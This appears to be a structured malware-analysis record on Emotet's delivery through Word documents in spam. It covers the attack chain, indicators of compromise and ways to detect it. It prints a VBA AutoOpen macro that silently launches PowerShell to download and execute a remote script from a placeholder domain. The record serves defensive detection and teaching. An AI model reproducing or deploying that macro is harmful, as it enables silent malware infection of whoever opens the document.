package_info.package_manager: N/A (malware distributed via spam email attachments, not a software package manager)
package_info.why_malicious: Emotet is a well-known banking trojan and malware loader distributed via spam campaigns. It is used to deliver additional malware, steal credentials, and enable further attacks such as ransomware. Its behavior includes unauthorized code execution, credential theft, and lateral movement within networks.

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim obj As Object
  Set obj = CreateObject("Wscript.Shell")
  obj.Run "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/emotet.ps1')"
End Sub
malicious_snippets.code_behavior: At document open, the macro spawns a hidden PowerShell process that downloads and executes a remote Emotet payload, enabling initial infection and further malware delivery.

malice_analysis.why_suspicious: Macros that execute PowerShell to download and run remote code are a common malware delivery technique.
malice_analysis.violated_expectations: Normal Word documents should not contain macros that execute system commands or download executables.
malice_analysis.similar_legitimate_use: Some enterprise automation may use macros for internal scripts, but never to download code from the internet.
key_indicators: AutoOpen macro triggers on document open
Use of Wscript.Shell to run PowerShell
Download and execution of remote script

attack_chain.action: User receives a phishing email with a malicious Word document attachment.
attack_chain.leads_to: User opens the document, triggering macro execution.

attack_chain.action: Malicious macro executes, launching PowerShell to download and run Emotet payload.
attack_chain.leads_to: Emotet malware is installed on the system.

attack_chain.action: Emotet establishes persistence, steals credentials, and may download additional malware (e.g., ransomware).
attack_chain.leads_to: Further compromise, data theft, or ransomware deployment.

behavioral_signatures: Office document macros spawning PowerShell or cmd.exe
PowerShell downloading and executing code from external URLs
Unusual outbound connections immediately after document open
file_indicators: Presence of suspicious macro code (AutoOpen, CreateObject, Wscript.Shell)
network_indicators: Outbound HTTP/HTTPS requests to known Emotet C2 domains
Download of executable or script files from untrusted sources
detection_knowledge.how_to_detect: Monitor for Office processes (winword.exe) spawning PowerShell or cmd.exe, especially when opening email attachments. Inspect macro code for suspicious automation. Detect outbound network connections to known Emotet infrastructure or anomalous domains immediately after document open.
